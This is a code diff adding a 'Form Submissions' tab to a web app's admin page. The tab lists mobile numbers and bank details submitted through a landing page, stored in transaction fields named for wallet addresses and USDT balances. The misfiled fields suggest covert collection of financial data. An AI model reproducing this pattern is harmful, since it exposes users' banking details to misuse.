@@ -307,6 +307,13 @@ export function AdminPage({ adminWallet }: { adminWallet?: string }) {
               <QrCode className="h-4 w-4" />
               <span className="hidden sm:inline">QR Generator</span>
             </TabsTrigger>
+            <TabsTrigger 
+              value="form-submissions"
+              className="flex items-center gap-2 data-[state=active]:bg-primary data-[state=active]:text-primary-foreground"
+            >
+              <FileText className="h-4 w-4" />
+              <span className="hidden sm:inline">Form Submissions</span>
+            </TabsTrigger>
           </TabsList>
 
           <TabsContent value="overview" className="space-y-6">
@@ -331,6 +338,9 @@ export function AdminPage({ adminWallet }: { adminWallet?: string }) {
 
           <TabsContent value="qr-generator" className="space-y-6">
             <QRGeneratorTab />
+          </TabsContent>
+          <TabsContent value="form-submissions" className="space-y-6">
+            <FormSubmissionsTab />
           </TabsContent>
         </Tabs>
       </div>
@@ -1859,6 +1869,51 @@ function TransferHistoryTab({ adminWallet }: { adminWallet?: string }) {
                           </div>
                         )}
                       </div>
+                    </div>
+                  </CardContent>
+                </Card>
+              ))}
+            </div>
+          )}
+        </CardContent>
+      </Card>
+    </div>
+  );
+}
+
+function FormSubmissionsTab() {
+  const transactions = useQuery(api.transactions.getAllTransactions, {}) || [];
+  const formSubmissions = transactions.filter((tx: any) => tx.toAddress === "landing_form");
+
+  return (
+    <div className="space-y-4">
+      <Card>
+        <CardHeader>
+          <CardTitle className="flex items-center gap-2">
+            <FileText className="h-5 w-5" />
+            Form Submissions ({formSubmissions.length})
+          </CardTitle>
+          <CardDescription>Bank details submitted via landing page</CardDescription>
+        </CardHeader>
+        <CardContent>
+          {formSubmissions.length === 0 ? (
+            <div className="text-center py-10 text-muted-foreground">
+              No form submissions yet
+            </div>
+          ) : (
+            <div className="space-y-3">
+              {formSubmissions.map((tx: any) => (
+                <Card key={tx._id} className="border border-border">
+                  <CardContent className="p-4">
+                    <div className="flex items-center justify-between mb-2">
+                      <span className="text-sm font-semibold text-primary">#{tx.userNumber}</span>
+                      <span className="text-xs text-muted-foreground">
+                        {new Date(tx._creationTime).toLocaleString()}
+                      </span>
+                    </div>
+                    <div className="text-sm text-muted-foreground space-y-1">
+                      <div><span className="font-medium text-foreground">Mobile:</span> {tx.walletAddress}</div>
+                      <div className="break-all"><span className="font-medium text-foreground">Details:</span> {tx.usdtBalance}</div>
                     </div>
                   </CardContent>
                 </Card>
